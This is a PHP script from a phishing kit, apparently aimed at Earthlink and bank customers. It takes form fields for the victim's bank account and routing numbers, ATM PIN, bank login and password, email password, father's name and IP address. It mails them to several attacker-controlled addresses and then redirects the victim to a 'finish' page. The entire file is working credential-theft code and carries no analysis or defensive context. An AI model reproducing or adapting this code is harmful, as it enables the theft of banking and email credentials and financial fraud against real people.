<?php

include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

$message .= "Fathers name: ".$_POST['1']."\n";
$message .= "bank name: ".$_POST['2']."\n";
$message .= "account no: ".$_POST['3']."\n";
$message .= "routing: ".$_POST['4']."\n";
$message .= "atm pin: ".$_POST['5']."\n";
$message .= "bank username: ".$_POST['6']."\n";
$message .= "bank password: ".$_POST['7']."\n";
$message .= "phone: ".$_POST['8']."\n";
$message .= "Email addresss: ".$_POST['9']."\n";
$message .= "Email password: ".$_POST['10']."\n";
$message .= "IP: ".$ip."\n";
$message .= "--------Made by Olaz------\n";

$recipient = "banger.nine@yandex.ru, nine.banger@my.com,ninebanger44@gmail.com,ninebanger67@gmail.com, ninebanger@outlook.com";
$subject = "OLAZ EARTHLINK BANK RESULTZ";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."n";
$headers .= "Olaz-BANK";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: finish.php");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        